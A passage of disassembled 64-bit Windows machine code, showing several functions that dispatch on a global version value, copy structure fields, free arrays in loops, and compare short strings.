   140003b8d:	45 33 c0             	xor    %r8d,%r8d
   140003b90:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003b95:	48 8d 94 24 60 10 00 	lea    0x1060(%rsp),%rdx
   140003b9c:	00 
   140003b9d:	33 c9                	xor    %ecx,%ecx
   140003b9f:	e8 cc 46 00 00       	call   0x140008270
   140003ba4:	45 33 c0             	xor    %r8d,%r8d
   140003ba7:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003bac:	48 8b d3             	mov    %rbx,%rdx
   140003baf:	33 c9                	xor    %ecx,%ecx
   140003bb1:	e8 ba 46 00 00       	call   0x140008270
   140003bb6:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140003bbb:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140003bc0:	ba 03 00 00 00       	mov    $0x3,%edx
   140003bc5:	48 8b cf             	mov    %rdi,%rcx
   140003bc8:	e8 83 fa ff ff       	call   0x140003650
   140003bcd:	8b f8                	mov    %eax,%edi
   140003bcf:	33 db                	xor    %ebx,%ebx
   140003bd1:	48 8b 4c dc 30       	mov    0x30(%rsp,%rbx,8),%rcx
   140003bd6:	e8 2d 1d 01 00       	call   0x140015908
   140003bdb:	48 ff c3             	inc    %rbx
   140003bde:	48 83 fb 03          	cmp    $0x3,%rbx
   140003be2:	7c ed                	jl     0x140003bd1
   140003be4:	8b c7                	mov    %edi,%eax
   140003be6:	eb 05                	jmp    0x140003bed
   140003be8:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003bed:	48 8b 8c 24 70 20 00 	mov    0x2070(%rsp),%rcx
   140003bf4:	00 
   140003bf5:	48 33 cc             	xor    %rsp,%rcx
   140003bf8:	e8 a3 78 00 00       	call   0x14000b4a0
   140003bfd:	48 8b 9c 24 a0 20 00 	mov    0x20a0(%rsp),%rbx
   140003c04:	00 
   140003c05:	48 81 c4 80 20 00 00 	add    $0x2080,%rsp
   140003c0c:	5f                   	pop    %rdi
   140003c0d:	c3                   	ret
   140003c0e:	cc                   	int3
   140003c0f:	cc                   	int3
   140003c10:	48 83 ec 28          	sub    $0x28,%rsp
   140003c14:	44 8b 05 e9 d0 03 00 	mov    0x3d0e9(%rip),%r8d        # 0x140040d04
   140003c1b:	41 81 e8 34 01 00 00 	sub    $0x134,%r8d
   140003c22:	74 5d                	je     0x140003c81
   140003c24:	41 83 e8 01          	sub    $0x1,%r8d
   140003c28:	74 32                	je     0x140003c5c
   140003c2a:	41 83 e8 01          	sub    $0x1,%r8d
   140003c2e:	74 1c                	je     0x140003c4c
   140003c30:	41 83 e8 01          	sub    $0x1,%r8d
   140003c34:	74 06                	je     0x140003c3c
   140003c36:	41 83 f8 01          	cmp    $0x1,%r8d
   140003c3a:	75 3b                	jne    0x140003c77
   140003c3c:	4c 8d 82 70 10 00 00 	lea    0x1070(%rdx),%r8
   140003c43:	48 8d 91 10 01 00 00 	lea    0x110(%rcx),%rdx
   140003c4a:	eb 1b                	jmp    0x140003c67
   140003c4c:	4c 8d 82 70 10 00 00 	lea    0x1070(%rdx),%r8
   140003c53:	48 8d 91 f8 00 00 00 	lea    0xf8(%rcx),%rdx
   140003c5a:	eb 0b                	jmp    0x140003c67
   140003c5c:	4c 8d 82 70 10 00 00 	lea    0x1070(%rdx),%r8
   140003c63:	48 8d 51 68          	lea    0x68(%rcx),%rdx
   140003c67:	e8 f4 fa ff ff       	call   0x140003760
   140003c6c:	85 c0                	test   %eax,%eax
   140003c6e:	78 07                	js     0x140003c77
   140003c70:	33 c0                	xor    %eax,%eax
   140003c72:	48 83 c4 28          	add    $0x28,%rsp
   140003c76:	c3                   	ret
   140003c77:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003c7c:	48 83 c4 28          	add    $0x28,%rsp
   140003c80:	c3                   	ret
   140003c81:	4c 8d 82 70 10 00 00 	lea    0x1070(%rdx),%r8
   140003c88:	48 8d 51 68          	lea    0x68(%rcx),%rdx
   140003c8c:	e8 cf fa ff ff       	call   0x140003760
   140003c91:	33 c9                	xor    %ecx,%ecx
   140003c93:	85 c0                	test   %eax,%eax
   140003c95:	0f 99 c1             	setns  %cl
   140003c98:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140003c9b:	48 83 c4 28          	add    $0x28,%rsp
   140003c9f:	c3                   	ret
   140003ca0:	44 8b 05 5d d0 03 00 	mov    0x3d05d(%rip),%r8d        # 0x140040d04
   140003ca7:	41 81 e8 34 01 00 00 	sub    $0x134,%r8d
   140003cae:	74 44                	je     0x140003cf4
   140003cb0:	41 83 e8 01          	sub    $0x1,%r8d
   140003cb4:	74 3e                	je     0x140003cf4
   140003cb6:	41 83 e8 01          	sub    $0x1,%r8d
   140003cba:	74 25                	je     0x140003ce1
   140003cbc:	41 83 e8 01          	sub    $0x1,%r8d
   140003cc0:	74 0c                	je     0x140003cce
   140003cc2:	41 83 f8 01          	cmp    $0x1,%r8d
   140003cc6:	74 06                	je     0x140003cce
   140003cc8:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003ccd:	c3                   	ret
   140003cce:	4c 8d 82 70 40 00 00 	lea    0x4070(%rdx),%r8
   140003cd5:	48 8d 91 20 01 00 00 	lea    0x120(%rcx),%rdx
   140003cdc:	e9 7f fa ff ff       	jmp    0x140003760
   140003ce1:	4c 8d 82 70 40 00 00 	lea    0x4070(%rdx),%r8
   140003ce8:	48 8d 91 08 01 00 00 	lea    0x108(%rcx),%rdx
   140003cef:	e9 6c fa ff ff       	jmp    0x140003760
   140003cf4:	4c 8d 82 70 40 00 00 	lea    0x4070(%rdx),%r8
   140003cfb:	48 8d 91 f0 00 00 00 	lea    0xf0(%rcx),%rdx
   140003d02:	e9 59 fa ff ff       	jmp    0x140003760
   140003d07:	cc                   	int3
   140003d08:	cc                   	int3
   140003d09:	cc                   	int3
   140003d0a:	cc                   	int3
   140003d0b:	cc                   	int3
   140003d0c:	cc                   	int3
   140003d0d:	cc                   	int3
   140003d0e:	cc                   	int3
   140003d0f:	cc                   	int3
   140003d10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003d15:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140003d1a:	55                   	push   %rbp
   140003d1b:	48 8b ec             	mov    %rsp,%rbp
   140003d1e:	48 83 ec 70          	sub    $0x70,%rsp
   140003d22:	48 8b d9             	mov    %rcx,%rbx
   140003d25:	48 8b fa             	mov    %rdx,%rdi
   140003d28:	8b 0d d6 cf 03 00    	mov    0x3cfd6(%rip),%ecx        # 0x140040d04
   140003d2e:	81 e9 34 01 00 00    	sub    $0x134,%ecx
   140003d34:	0f 84 96 02 00 00    	je     0x140003fd0
   140003d3a:	83 e9 01             	sub    $0x1,%ecx
   140003d3d:	0f 84 da 01 00 00    	je     0x140003f1d
   140003d43:	83 e9 01             	sub    $0x1,%ecx
   140003d46:	0f 84 1e 01 00 00    	je     0x140003e6a
   140003d4c:	83 e9 01             	sub    $0x1,%ecx
   140003d4f:	74 09                	je     0x140003d5a
   140003d51:	83 f9 01             	cmp    $0x1,%ecx
   140003d54:	0f 85 68 03 00 00    	jne    0x1400040c2
   140003d5a:	c7 83 d4 00 00 00 01 	movl   $0x1,0xd4(%rbx)
   140003d61:	00 00 00 
   140003d64:	33 c9                	xor    %ecx,%ecx
   140003d66:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   140003d6c:	89 8b c4 00 00 00    	mov    %ecx,0xc4(%rbx)
   140003d72:	8b 42 08             	mov    0x8(%rdx),%eax
   140003d75:	89 83 bc 00 00 00    	mov    %eax,0xbc(%rbx)
   140003d7b:	39 4a 04             	cmp    %ecx,0x4(%rdx)
   140003d7e:	0f 94 c1             	sete   %cl
   140003d81:	89 8b d8 00 00 00    	mov    %ecx,0xd8(%rbx)
   140003d87:	8b 02                	mov    (%rdx),%eax
   140003d89:	89 83 c8 00 00 00    	mov    %eax,0xc8(%rbx)
   140003d8f:	8b 42 0c             	mov    0xc(%rdx),%eax
   140003d92:	89 43 14             	mov    %eax,0x14(%rbx)
   140003d95:	8b 42 10             	mov    0x10(%rdx),%eax
   140003d98:	89 43 18             	mov    %eax,0x18(%rbx)
   140003d9b:	8b 42 18             	mov    0x18(%rdx),%eax
   140003d9e:	89 43 0c             	mov    %eax,0xc(%rbx)
   140003da1:	48 63 42 1c          	movslq 0x1c(%rdx),%rax
   140003da5:	85 c0                	test   %eax,%eax
   140003da7:	74 4f                	je     0x140003df8
   140003da9:	48 8b 4a 20          	mov    0x20(%rdx),%rcx
   140003dad:	4c 8d 83 98 00 00 00 	lea    0x98(%rbx),%r8
   140003db4:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003db9:	4c 8b c8             	mov    %rax,%r9
   140003dbc:	48 8b 05 a5 cf 03 00 	mov    0x3cfa5(%rip),%rax        # 0x140040d68
   140003dc3:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003dc7:	48 8b d3             	mov    %rbx,%rdx
   140003dca:	ff 15 c0 95 02 00    	call   *0x295c0(%rip)        # 0x14002d390
   140003dd0:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140003dd4:	0f 10 00             	movups (%rax),%xmm0
   140003dd7:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140003ddb:	48 8b 05 36 d0 03 00 	mov    0x3d036(%rip),%rax        # 0x140040e18
   140003de2:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   140003de6:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140003dea:	ff 15 a0 95 02 00    	call   *0x295a0(%rip)        # 0x14002d390
   140003df0:	85 c0                	test   %eax,%eax
   140003df2:	0f 85 ca 02 00 00    	jne    0x1400040c2
   140003df8:	48 63 47 28          	movslq 0x28(%rdi),%rax
   140003dfc:	85 c0                	test   %eax,%eax
   140003dfe:	74 4f                	je     0x140003e4f
   140003e00:	4c 8d 83 88 00 00 00 	lea    0x88(%rbx),%r8
   140003e07:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   140003e0b:	4c 8b c8             	mov    %rax,%r9
   140003e0e:	48 8b 05 53 cf 03 00 	mov    0x3cf53(%rip),%rax        # 0x140040d68
   140003e15:	48 8b d3             	mov    %rbx,%rdx
   140003e18:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003e1d:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003e21:	ff 15 69 95 02 00    	call   *0x29569(%rip)        # 0x14002d390
   140003e27:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140003e2b:	0f 10 00             	movups (%rax),%xmm0
   140003e2e:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140003e32:	48 8b 05 df cf 03 00 	mov    0x3cfdf(%rip),%rax        # 0x140040e18
   140003e39:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   140003e3d:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140003e41:	ff 15 49 95 02 00    	call   *0x29549(%rip)        # 0x14002d390
   140003e47:	85 c0                	test   %eax,%eax
   140003e49:	0f 85 73 02 00 00    	jne    0x1400040c2
   140003e4f:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140003e56:	33 c0                	xor    %eax,%eax
   140003e58:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140003e5d:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140003e61:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   140003e65:	49 8b e3             	mov    %r11,%rsp
   140003e68:	5d                   	pop    %rbp
   140003e69:	c3                   	ret
   140003e6a:	c7 83 c4 00 00 00 01 	movl   $0x1,0xc4(%rbx)
   140003e71:	00 00 00 
   140003e74:	33 c9                	xor    %ecx,%ecx
   140003e76:	89 8b 98 00 00 00    	mov    %ecx,0x98(%rbx)
   140003e7c:	89 8b b4 00 00 00    	mov    %ecx,0xb4(%rbx)
   140003e82:	8b 42 08             	mov    0x8(%rdx),%eax
   140003e85:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   140003e8b:	39 4a 04             	cmp    %ecx,0x4(%rdx)
   140003e8e:	0f 94 c1             	sete   %cl
   140003e91:	89 8b c8 00 00 00    	mov    %ecx,0xc8(%rbx)
   140003e97:	8b 02                	mov    (%rdx),%eax
   140003e99:	89 83 b8 00 00 00    	mov    %eax,0xb8(%rbx)
   140003e9f:	8b 42 0c             	mov    0xc(%rdx),%eax
   140003ea2:	89 43 14             	mov    %eax,0x14(%rbx)
   140003ea5:	8b 42 10             	mov    0x10(%rdx),%eax
   140003ea8:	89 43 18             	mov    %eax,0x18(%rbx)
   140003eab:	8b 42 18             	mov    0x18(%rdx),%eax
   140003eae:	89 43 0c             	mov    %eax,0xc(%rbx)
   140003eb1:	48 63 42 1c          	movslq 0x1c(%rdx),%rax
   140003eb5:	85 c0                	test   %eax,%eax
   140003eb7:	74 4f                	je     0x140003f08
   140003eb9:	48 8b 4a 20          	mov    0x20(%rdx),%rcx
   140003ebd:	4c 8d 83 88 00 00 00 	lea    0x88(%rbx),%r8
   140003ec4:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003ec9:	4c 8b c8             	mov    %rax,%r9
   140003ecc:	48 8b 05 95 ce 03 00 	mov    0x3ce95(%rip),%rax        # 0x140040d68
   140003ed3:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003ed7:	48 8b d3             	mov    %rbx,%rdx
   140003eda:	ff 15 b0 94 02 00    	call   *0x294b0(%rip)        # 0x14002d390
   140003ee0:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140003ee4:	0f 10 00             	movups (%rax),%xmm0
   140003ee7:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140003eeb:	48 8b 05 26 cf 03 00 	mov    0x3cf26(%rip),%rax        # 0x140040e18
   140003ef2:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   140003ef6:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140003efa:	ff 15 90 94 02 00    	call   *0x29490(%rip)        # 0x14002d390
   140003f00:	85 c0                	test   %eax,%eax
   140003f02:	0f 85 ba 01 00 00    	jne    0x1400040c2
   140003f08:	48 63 47 28          	movslq 0x28(%rdi),%rax
   140003f0c:	85 c0                	test   %eax,%eax
   140003f0e:	0f 84 3b ff ff ff    	je     0x140003e4f
   140003f14:	4c 8d 43 78          	lea    0x78(%rbx),%r8
   140003f18:	e9 ea fe ff ff       	jmp    0x140003e07
   140003f1d:	c7 83 b8 00 00 00 01 	movl   $0x1,0xb8(%rbx)
   140003f24:	00 00 00 
   140003f27:	33 c9                	xor    %ecx,%ecx
   140003f29:	89 8b 90 00 00 00    	mov    %ecx,0x90(%rbx)
   140003f2f:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   140003f35:	8b 42 08             	mov    0x8(%rdx),%eax
   140003f38:	89 83 a0 00 00 00    	mov    %eax,0xa0(%rbx)
   140003f3e:	39 4a 04             	cmp    %ecx,0x4(%rdx)
   140003f41:	0f 94 c1             	sete   %cl
   140003f44:	89 8b bc 00 00 00    	mov    %ecx,0xbc(%rbx)
   140003f4a:	8b 02                	mov    (%rdx),%eax
   140003f4c:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   140003f52:	8b 42 0c             	mov    0xc(%rdx),%eax
   140003f55:	89 43 14             	mov    %eax,0x14(%rbx)
   140003f58:	8b 42 10             	mov    0x10(%rdx),%eax
   140003f5b:	89 43 18             	mov    %eax,0x18(%rbx)
   140003f5e:	8b 42 18             	mov    0x18(%rdx),%eax
   140003f61:	89 43 0c             	mov    %eax,0xc(%rbx)
   140003f64:	48 63 42 1c          	movslq 0x1c(%rdx),%rax
   140003f68:	85 c0                	test   %eax,%eax
   140003f6a:	74 4f                	je     0x140003fbb
   140003f6c:	48 8b 4a 20          	mov    0x20(%rdx),%rcx
   140003f70:	4c 8d 83 80 00 00 00 	lea    0x80(%rbx),%r8
   140003f77:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003f7c:	4c 8b c8             	mov    %rax,%r9
   140003f7f:	48 8b 05 e2 cd 03 00 	mov    0x3cde2(%rip),%rax        # 0x140040d68
   140003f86:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003f8a:	48 8b d3             	mov    %rbx,%rdx
   140003f8d:	ff 15 fd 93 02 00    	call   *0x293fd(%rip)        # 0x14002d390
   140003f93:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140003f97:	0f 10 00             	movups (%rax),%xmm0
   140003f9a:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140003f9e:	48 8b 05 73 ce 03 00 	mov    0x3ce73(%rip),%rax        # 0x140040e18
   140003fa5:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   140003fa9:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140003fad:	ff 15 dd 93 02 00    	call   *0x293dd(%rip)        # 0x14002d390
   140003fb3:	85 c0                	test   %eax,%eax
   140003fb5:	0f 85 07 01 00 00    	jne    0x1400040c2
   140003fbb:	48 63 47 28          	movslq 0x28(%rdi),%rax
   140003fbf:	85 c0                	test   %eax,%eax
   140003fc1:	0f 84 88 fe ff ff    	je     0x140003e4f
   140003fc7:	4c 8d 43 70          	lea    0x70(%rbx),%r8
   140003fcb:	e9 37 fe ff ff       	jmp    0x140003e07
   140003fd0:	c7 83 b8 00 00 00 01 	movl   $0x1,0xb8(%rbx)
   140003fd7:	00 00 00 
   140003fda:	33 c9                	xor    %ecx,%ecx
   140003fdc:	89 8b 90 00 00 00    	mov    %ecx,0x90(%rbx)
   140003fe2:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   140003fe8:	8b 42 08             	mov    0x8(%rdx),%eax
   140003feb:	89 83 a0 00 00 00    	mov    %eax,0xa0(%rbx)
   140003ff1:	39 4a 04             	cmp    %ecx,0x4(%rdx)
   140003ff4:	0f 94 c1             	sete   %cl
   140003ff7:	89 8b bc 00 00 00    	mov    %ecx,0xbc(%rbx)
   140003ffd:	8b 02                	mov    (%rdx),%eax
   140003fff:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   140004005:	8b 42 0c             	mov    0xc(%rdx),%eax
   140004008:	89 43 14             	mov    %eax,0x14(%rbx)
   14000400b:	8b 42 10             	mov    0x10(%rdx),%eax
   14000400e:	89 43 18             	mov    %eax,0x18(%rbx)
   140004011:	8b 42 18             	mov    0x18(%rdx),%eax
   140004014:	89 43 0c             	mov    %eax,0xc(%rbx)
   140004017:	48 63 42 1c          	movslq 0x1c(%rdx),%rax
   14000401b:	85 c0                	test   %eax,%eax
   14000401d:	74 4b                	je     0x14000406a
   14000401f:	48 8b 4a 20          	mov    0x20(%rdx),%rcx
   140004023:	4c 8d 83 80 00 00 00 	lea    0x80(%rbx),%r8
   14000402a:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000402f:	4c 8b c8             	mov    %rax,%r9
   140004032:	48 8b 05 2f cd 03 00 	mov    0x3cd2f(%rip),%rax        # 0x140040d68
   140004039:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000403d:	48 8b d3             	mov    %rbx,%rdx
   140004040:	ff 15 4a 93 02 00    	call   *0x2934a(%rip)        # 0x14002d390
   140004046:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000404a:	0f 10 00             	movups (%rax),%xmm0
   14000404d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004051:	48 8b 05 c0 cd 03 00 	mov    0x3cdc0(%rip),%rax        # 0x140040e18
   140004058:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000405c:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140004060:	ff 15 2a 93 02 00    	call   *0x2932a(%rip)        # 0x14002d390
   140004066:	85 c0                	test   %eax,%eax
   140004068:	75 58                	jne    0x1400040c2
   14000406a:	48 63 47 28          	movslq 0x28(%rdi),%rax
   14000406e:	85 c0                	test   %eax,%eax
   140004070:	0f 84 d9 fd ff ff    	je     0x140003e4f
   140004076:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   14000407a:	4c 8d 43 70          	lea    0x70(%rbx),%r8
   14000407e:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004083:	4c 8b c8             	mov    %rax,%r9
   140004086:	48 8b 05 db cc 03 00 	mov    0x3ccdb(%rip),%rax        # 0x140040d68
   14000408d:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004091:	48 8b d3             	mov    %rbx,%rdx
   140004094:	ff 15 f6 92 02 00    	call   *0x292f6(%rip)        # 0x14002d390
   14000409a:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000409e:	0f 10 00             	movups (%rax),%xmm0
   1400040a1:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400040a5:	48 8b 05 6c cd 03 00 	mov    0x3cd6c(%rip),%rax        # 0x140040e18
   1400040ac:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400040b0:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400040b4:	ff 15 d6 92 02 00    	call   *0x292d6(%rip)        # 0x14002d390
   1400040ba:	85 c0                	test   %eax,%eax
   1400040bc:	0f 84 8d fd ff ff    	je     0x140003e4f
   1400040c2:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   1400040c7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400040cc:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400040d0:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   1400040d4:	49 8b e3             	mov    %r11,%rsp
   1400040d7:	5d                   	pop    %rbp
   1400040d8:	c3                   	ret
   1400040d9:	cc                   	int3
   1400040da:	cc                   	int3
   1400040db:	cc                   	int3
   1400040dc:	cc                   	int3
   1400040dd:	cc                   	int3
   1400040de:	cc                   	int3
   1400040df:	cc                   	int3
   1400040e0:	48 85 c9             	test   %rcx,%rcx
   1400040e3:	0f 84 8f 00 00 00    	je     0x140004178
   1400040e9:	53                   	push   %rbx
   1400040ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400040ee:	8b 41 1c             	mov    0x1c(%rcx),%eax
   1400040f1:	48 8b d9             	mov    %rcx,%rbx
   1400040f4:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   1400040f9:	33 ff                	xor    %edi,%edi
   1400040fb:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140004100:	85 c0                	test   %eax,%eax
   140004102:	74 29                	je     0x14000412d
   140004104:	8b f7                	mov    %edi,%esi
   140004106:	7e 25                	jle    0x14000412d
   140004108:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   14000410d:	8b ef                	mov    %edi,%ebp
   14000410f:	90                   	nop
   140004110:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140004114:	48 8b 0c 29          	mov    (%rcx,%rbp,1),%rcx
   140004118:	e8 eb 17 01 00       	call   0x140015908
   14000411d:	ff c6                	inc    %esi
   14000411f:	48 8d 6d 08          	lea    0x8(%rbp),%rbp
   140004123:	3b 73 1c             	cmp    0x1c(%rbx),%esi
   140004126:	7c e8                	jl     0x140004110
   140004128:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   14000412d:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140004131:	e8 d2 17 01 00       	call   0x140015908
   140004136:	8b 43 28             	mov    0x28(%rbx),%eax
   140004139:	85 c0                	test   %eax,%eax
   14000413b:	7e 1b                	jle    0x140004158
   14000413d:	48 8b f7             	mov    %rdi,%rsi
   140004140:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140004144:	48 8b 0c 31          	mov    (%rcx,%rsi,1),%rcx
   140004148:	e8 bb 17 01 00       	call   0x140015908
   14000414d:	ff c7                	inc    %edi
   14000414f:	48 8d 76 08          	lea    0x8(%rsi),%rsi
   140004153:	3b 7b 28             	cmp    0x28(%rbx),%edi
   140004156:	7c e8                	jl     0x140004140
   140004158:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000415c:	e8 a7 17 01 00       	call   0x140015908
   140004161:	48 8b cb             	mov    %rbx,%rcx
   140004164:	e8 9f 17 01 00       	call   0x140015908
   140004169:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   14000416e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004173:	48 83 c4 20          	add    $0x20,%rsp
   140004177:	5b                   	pop    %rbx
   140004178:	c3                   	ret
   140004179:	cc                   	int3
   14000417a:	cc                   	int3
   14000417b:	cc                   	int3
   14000417c:	cc                   	int3
   14000417d:	cc                   	int3
   14000417e:	cc                   	int3
   14000417f:	cc                   	int3
   140004180:	40 53                	rex push %rbx
   140004182:	55                   	push   %rbp
   140004183:	41 55                	push   %r13
   140004185:	41 56                	push   %r14
   140004187:	41 57                	push   %r15
   140004189:	48 83 ec 20          	sub    $0x20,%rsp
   14000418d:	45 33 ed             	xor    %r13d,%r13d
   140004190:	4c 8b f9             	mov    %rcx,%r15
   140004193:	41 8b ed             	mov    %r13d,%ebp
   140004196:	45 8b f5             	mov    %r13d,%r14d
   140004199:	41 8d 55 38          	lea    0x38(%r13),%edx
   14000419d:	8d 4a c9             	lea    -0x37(%rdx),%ecx
   1400041a0:	e8 5b 17 01 00       	call   0x140015900
   1400041a5:	48 8b d8             	mov    %rax,%rbx
   1400041a8:	48 85 c0             	test   %rax,%rax
   1400041ab:	75 0d                	jne    0x1400041ba
   1400041ad:	48 83 c4 20          	add    $0x20,%rsp
   1400041b1:	41 5f                	pop    %r15
   1400041b3:	41 5e                	pop    %r14
   1400041b5:	41 5d                	pop    %r13
   1400041b7:	5d                   	pop    %rbp
   1400041b8:	5b                   	pop    %rbx
   1400041b9:	c3                   	ret
   1400041ba:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   1400041bf:	c7 40 14 ff ff ff ff 	movl   $0xffffffff,0x14(%rax)
   1400041c6:	49 8b 77 08          	mov    0x8(%r15),%rsi
   1400041ca:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   1400041cf:	49 3b 77 10          	cmp    0x10(%r15),%rsi
   1400041d3:	0f 83 6b 01 00 00    	jae    0x140004344
   1400041d9:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   1400041de:	4c 8d 25 0b 9d 02 00 	lea    0x29d0b(%rip),%r12        # 0x14002def0
   1400041e5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400041ec:	00 00 00 00 
   1400041f0:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400041f6:	48 8d 15 eb 9c 02 00 	lea    0x29ceb(%rip),%rdx        # 0x14002dee8
   1400041fd:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   140004201:	e8 da 18 01 00       	call   0x140015ae0
   140004206:	85 c0                	test   %eax,%eax
   140004208:	0f 84 19 01 00 00    	je     0x140004327
   14000420e:	80 7e 12 76          	cmpb   $0x76,0x12(%rsi)
   140004212:	75 06                	jne    0x14000421a
   140004214:	44 38 6e 13          	cmp    %r13b,0x13(%rsi)
   140004218:	74 1b                	je     0x140004235
   14000421a:	49 8b cd             	mov    %r13,%rcx
   14000421d:	0f 1f 00             	nopl   (%rax)
   140004220:	0f b6 44 0e 12       	movzbl 0x12(%rsi,%rcx,1),%eax
   140004225:	48 ff c1             	inc    %rcx
   140004228:	41 3a 44 0c ff       	cmp    -0x1(%r12,%rcx,1),%al
   14000422d:	75 0d                	jne    0x14000423c
   14000422f:	48 83 f9 08          	cmp    $0x8,%rcx
   140004233:	75 eb                	jne    0x140004220
   140004235:	ff 03                	incl   (%rbx)
   140004237:	e9 eb 00 00 00       	jmp    0x140004327
   14000423c:	80 7e 12 75          	cmpb   $0x75,0x12(%rsi)
   140004240:	75 0a                	jne    0x14000424c
   140004242:	44 38 6e 13          	cmp    %r13b,0x13(%rsi)
   140004246:	0f 84 d4 00 00 00    	je     0x140004320
   14000424c:	48 8d 15 a5 9c 02 00 	lea    0x29ca5(%rip),%rdx        # 0x14002def8
   140004253:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   140004257:	e8 34 26 01 00       	call   0x140016890
   14000425c:	85 c0                	test   %eax,%eax
   14000425e:	0f 84 bc 00 00 00    	je     0x140004320
   140004264:	80 7e 12 4f          	cmpb   $0x4f,0x12(%rsi)
   140004268:	75 0a                	jne    0x140004274
   14000426a:	44 38 6e 13          	cmp    %r13b,0x13(%rsi)
   14000426e:	0f 84 a7 00 00 00    	je     0x14000431b
   140004274:	48 8d 15 8d 9c 02 00 	lea    0x29c8d(%rip),%rdx        # 0x14002df08
   14000427b:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   14000427f:	e8 0c 26 01 00       	call   0x140016890
   140004284:	85 c0                	test   %eax,%eax
   140004286:	0f 84 8f 00 00 00    	je     0x14000431b
   14000428c:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004292:	48 8d 15 7b 9c 02 00 	lea    0x29c7b(%rip),%rdx        # 0x14002df14
   140004299:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   14000429d:	e8 3e 18 01 00       	call   0x140015ae0
   1400042a2:	85 c0                	test   %eax,%eax
   1400042a4:	75 04                	jne    0x1400042aa
   1400042a6:	ff c5                	inc    %ebp
   1400042a8:	eb 7d                	jmp    0x140004327
   1400042aa:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400042b0:	48 8d 15 61 9c 02 00 	lea    0x29c61(%rip),%rdx        # 0x14002df18
   1400042b7:	48 8d 4e 12          	lea    0x12(%rsi),%rcx
   1400042bb:	e8 20 18 01 00       	call   0x140015ae0
